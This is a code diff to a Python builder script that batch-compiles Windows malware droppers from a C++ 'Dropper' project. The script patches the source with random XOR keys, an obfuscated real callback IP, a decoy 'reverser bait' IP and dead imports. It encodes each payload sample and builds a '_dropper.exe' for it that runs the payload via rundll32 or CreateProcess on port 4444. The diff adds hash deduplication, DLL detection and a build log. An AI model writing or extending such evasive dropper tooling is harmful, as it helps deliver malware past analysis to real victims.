@@ -5,15 +5,19 @@ import shutil
 import random
 import re
 import argparse
+import hashlib
+import struct
+import csv
+from datetime import datetime
 
-SAMPLES_DIR = r"C:\Users\krv\samples"
 RESOURCE_FILE = r"C:\Users\krv\payload.bin"
-OUTPUT_DIR = r"C:\Users\krv\output"
 MSBUILD = r"C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\amd64\MSBuild.exe"
 PROJECT = r"C:\Users\krv\source\repos\Dropper\filesystem.exe\droppertest\droppertest\droppertest.vcxproj"
 BUILT = r"C:\Users\krv\source\repos\Dropper\filesystem.exe\droppertest\droppertest\x64\Release\droppertest.exe"
 SOURCE = r"C:\Users\krv\source\repos\Dropper\filesystem.exe\Dropper\Dropper\Source.cpp"
 
+DEFAULT_INPUT_DIR = r"C:\Users\krv\samples"
+DEFAULT_OUTPUT_DIR = r"C:\Users\krv\output"
 DEFAULT_IP_XOR_KEY = 0x41
 DEFAULT_IP2_XOR_KEY = 0x41
 DEFAULT_PRIMARY_IP = "192.168.56.1"
@@ -22,6 +26,37 @@ DEFAULT_DECOY_IP = "192.168.56.1"
 DEFAULT_NAME_SIZE = 10
 DEFAULT_SERVER_PORT = 4444
 DEFAULT_BACKUP_PORT = 4444
+
+
+def compute_hash(filepath):
+    h = hashlib.sha256()
+    with open(filepath, "rb") as f:
+        for chunk in iter(lambda: f.read(8192), b""):
+            h.update(chunk)
+    return h.hexdigest()
+
+
+def is_dll(filepath):
+    try:
+        with open(filepath, "rb") as f:
+            if f.read(2) != b'MZ':
+                return False
+            f.seek(0x3C)
+            pe_offset = struct.unpack('<I', f.read(4))[0]
+            f.seek(pe_offset + 0x16)
+            characteristics = struct.unpack('<H', f.read(2))[0]
+        return bool(characteristics & 0x2000)
+    except Exception:
+        return False
+
+
+def write_log(log_path, record):
+    file_exists = os.path.isfile(log_path)
+    with open(log_path, "a", newline="") as f:
+        writer = csv.DictWriter(f, fieldnames=record.keys())
+        if not file_exists:
+            writer.writeheader()
+        writer.writerow(record)
 
 
 def xor_encode_ip(ip_str, key):
@@ -37,7 +72,7 @@ def toggle_define(source, name, enabled):
 
 
 def patch_source(source, xor_key, primary_ip, real_ip, real_ip_key, decoy_ip, decoy_ip_key,
-                 inject=True, xor_encode=True, base64_encode=True, random_name=True,
+                 inject=False, xor_encode=True, base64_encode=True, random_name=True,
                  dead_imports=True, name_size=10, server_port=4444, backup_port=4444):
     source = re.sub(r"#define XOR_KEY 0x[0-9a-fA-F]+",
                     f"#define XOR_KEY {hex(xor_key)}", source)
@@ -79,10 +114,16 @@ def main():
                         help="Real connection IP, obfuscated (dynamic analysis)")
     parser.add_argument("--ip3", required=True,
                         help="Secondary obfuscated IP, no connection (reverser bait)")
-    parser.add_argument("--inject", action="store_true", default=True,
-                        help="Drop and run as DLL via rundll32 (default)")
-    parser.add_argument("--no-inject", dest="inject", action="store_false",
-                        help="Drop and run as EXE directly")
+    parser.add_argument("--input-dir", default=DEFAULT_INPUT_DIR,
+                        help=f"Folder containing payload samples (default: {DEFAULT_INPUT_DIR})")
+    parser.add_argument("--output-dir", default=DEFAULT_OUTPUT_DIR,
+                        help=f"Folder to write built droppers (default: {DEFAULT_OUTPUT_DIR})")
+    # inject: None = auto-detect from PE header, True = force DLL, False = force EXE
+    inject_group = parser.add_mutually_exclusive_group()
+    inject_group.add_argument("--inject", dest="inject", action="store_true", default=None,
+                              help="Force DLL mode via rundll32 (overrides auto-detect)")
+    inject_group.add_argument("--no-inject", dest="inject", action="store_false",
+                              help="Force EXE mode via CreateProcess (overrides auto-detect)")
     parser.add_argument("--xor", action="store_true", default=True,
                         help="XOR encode payload (default)")
     parser.add_argument("--no-xor", dest="xor", action="store_false",
@@ -107,15 +148,38 @@ def main():
                         help=f"Decoy port (default: {DEFAULT_BACKUP_PORT})")
     args = parser.parse_args()
 
-    os.makedirs(OUTPUT_DIR, exist_ok=True)
+    os.makedirs(args.output_dir, exist_ok=True)
+    log_path = os.path.join(args.output_dir, "build_log.csv")
+    seen_hashes = {}  # hash -> first filename that had it
 
-    for filename in os.listdir(SAMPLES_DIR):
-        filepath = os.path.join(SAMPLES_DIR, filename)
+    for filename in os.listdir(args.input_dir):
+        filepath = os.path.join(args.input_dir, filename)
         if not os.path.isfile(filepath):
             continue
 
         print(f"[*] Processing {filename}")
 
+        # Deduplication
+        file_hash = compute_hash(filepath)
+        if file_hash in seen_hashes:
+            print(f"[!] Skipping {filename} — duplicate of {seen_hashes[file_hash]} (same SHA-256)")
+            continue
+        seen_hashes[file_hash] = filename
+
+        # Auto-detect EXE vs DLL
+        file_is_dll = is_dll(filepath)
+        if args.inject is None:
+            inject = file_is_dll
+            print(f"[*] Auto-detected: {'DLL' if inject else 'EXE'} mode")
+        else:
+            inject = args.inject
+            if inject and not file_is_dll:
+                print(f"[!] Error: --inject (DLL mode) requested but {filename} is not a DLL. Skipping.")
+                continue
+            if not inject and file_is_dll:
+                print(f"[!] Warning: --no-inject (EXE mode) requested but {filename} appears to be a DLL.")
+
+        # Random keys per build
         xor_key = random.randint(1, 255)
         ip_xor_key = random.randint(1, 255)
         ip2_xor_key = random.randint(1, 255)
@@ -123,6 +187,7 @@ def main():
         print(f"[*] IP XOR key (real): {hex(ip_xor_key)}")
         print(f"[*] IP2 XOR key (decoy): {hex(ip2_xor_key)}")
 
+        # Patch Source.cpp
         with open(SOURCE, "r") as f:
             source = f.read()
         source = patch_source(
@@ -133,7 +198,7 @@ def main():
             real_ip_key=ip_xor_key,
             decoy_ip=args.ip3,
             decoy_ip_key=ip2_xor_key,
-            inject=args.inject,
+            inject=inject,
             xor_encode=args.xor,
             base64_encode=args.base64,
             random_name=args.random_name,
@@ -145,7 +210,7 @@ def main():
         with open(SOURCE, "w") as f:
             f.write(source)
 
-        # Encode payload to match Source.cpp settings
+        # Encode payload
         with open(filepath, "rb") as f:
             raw = f.read()
         data = raw
@@ -156,6 +221,7 @@ def main():
         with open(RESOURCE_FILE, "wb") as f:
             f.write(data)
 
+        # Compile
         result = subprocess.run([
             MSBUILD, PROJECT,
             "/p:Configuration=Release",
@@ -169,9 +235,32 @@ def main():
             print(result.stdout)
             continue
 
-        out_path = os.path.join(OUTPUT_DIR, f"{filename}_dropper.exe")
+        out_name = f"{filename}_dropper.exe"
+        out_path = os.path.join(args.output_dir, out_name)
         shutil.copy(BUILT, out_path)
         print(f"[+] Done: {out_path}")
+
+        # Log
+        write_log(log_path, {
+            "timestamp": datetime.now().isoformat(),
+            "source_file": filename,
+            "source_hash": file_hash,
+            "output_file": out_name,
+            "inject": inject,
+            "xor_encode": args.xor,
+            "xor_key": hex(xor_key),
+            "ip_xor_key": hex(ip_xor_key),
+            "ip2_xor_key": hex(ip2_xor_key),
+            "base64": args.base64,
+            "random_name": args.random_name,
+            "dead_imports": args.dead_imports,
+            "name_size": args.name_size,
+            "server_port": args.server_port,
+            "backup_port": args.backup_port,
+            "ip1": args.ip1,
+            "ip2": args.ip2,
+            "ip3": args.ip3,
+        })
 
     # Reset Source.cpp to defaults
     with open(SOURCE, "r") as f:
@@ -197,8 +286,10 @@ def main():
         f.write(source)
 
     print("[*] Source.cpp reset to defaults")
-    os.remove(RESOURCE_FILE)
+    if os.path.exists(RESOURCE_FILE):
+    	os.remove(RESOURCE_FILE)
     print("[*] Cleaned up payload.bin")
+    print(f"[*] Build log written to {log_path}")
     print("[*] All samples processed.")
 
 
